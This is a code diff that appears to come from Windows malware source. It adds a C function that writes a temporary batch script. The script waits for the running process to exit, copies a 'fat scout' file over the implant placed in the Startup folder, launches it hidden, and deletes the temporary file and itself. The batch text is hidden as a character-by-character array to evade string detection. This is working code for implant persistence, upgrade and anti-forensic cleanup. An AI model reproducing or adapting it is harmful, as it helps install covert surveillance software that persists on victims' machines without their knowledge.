@@ -828,3 +828,60 @@ BOOL WMIExecQuerySearchEntryHash(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR st
 
 	return bFound;
 }
+
+VOID CreateFileReplacerBatch(__in PWCHAR lpGarbageFile, __in PWCHAR lpScoutStartupPath, __out PWCHAR *pBatchOutName)
+{
+	HANDLE hFile;
+	ULONG uTick, uOut;
+	PWCHAR pTempPath = GetTemp();
+	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
+	
+	/* 
+		@echo off
+		:t
+		timeout 1
+		for /f %%i in ('tasklist /FI "IMAGENAME eq %S"  ^| find /v /c ""' ) do set YO=%%i   # 1) current process name
+		if %YO%==4 goto :t
+		type "%S" > "%S"									  # 2) fat scout file , 3) scout path in startup
+		start /B cmd /c "%S"								  # 4) scout path in startup
+		del /F "%S"											  # 5) temp scout file 
+		del /F "%S"											  # 6) batch file 
+	*/
+	
+	CHAR pBatchFormat[] = { '@','e','c','h','o',' ','o','f','f', '\r', '\n', ':','t', '\r', '\n', 't', 'i', 'm', 'e', 'o', 'u', 't', ' ', '1', '\r', '\n', 'f', 'o', 'r', ' ', '/', 'f', ' ', '%', '%', '%', '%','i', ' ', 'i', 'n',' ','(', '\'', 't','a','s','k','l','i','s','t',' ','/','F','I',' ','"','I','M','A','G','E','N','A','M','E',' ','e','q',' ','%','S','"',' ', '^','|',' ','f','i','n','d', ' ', '/', 'v', ' ', '/', 'c', ' ', '"', '"', '\'',' ',')', ' ', 'd', 'o', ' ', 's', 'e', 't', ' ', 'Y', 'O', '=', '%', '%', '%', '%', 'i', '\r', '\n', 'i','f',' ', '%', '%', 'Y', 'O', '%', '%', '=', '=', '4', ' ','g','o','t','o',' ',':','t', '\r', '\n', 't','y','p','e',' ','"','%','S','"',' ','>', ' ','"','%','S','"', '\r', '\n', 's','t','a','r','t',' ','/','B',' ','c','m','d',' ','/','c',' ','"','%','S','"', '\r', '\n',  'd','e','l',' ','/','F',' ','"','%','S','"', '\r', '\n', 	'd','e','l',' ','/','F',' ','"','%','S','"', 0x0 };
+
+
+	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
+
+	uTick = GetTickCount();
+	do
+	{
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile && hFile != INVALID_HANDLE_VALUE)
+			break;
+	}
+	while (1);
+
+	WCHAR lpFullImageName[MAX_PATH*2];
+	GetModuleFileName(NULL, lpFullImageName, MAX_PATH*2);
+	PWCHAR lpImageName = PathFindFileName(lpFullImageName);
+
+	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, lpImageName, lpGarbageFile, lpScoutStartupPath, lpScoutStartupPath, lpGarbageFile, pBatchName); 
+	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
+	CloseHandle(hFile);
+
+#ifdef _DEBUG
+	OutputDebugString(pBatchName);
+	OutputDebugString(L"\n");
+	OutputDebugString(lpImageName);
+	OutputDebugString(L"\n");
+	OutputDebugStringA(pBatchBuffer);
+#endif
+
+
+	*pBatchOutName = pBatchName;
+
+	free(pBatchBuffer);
+	free(pTempPath);
+}
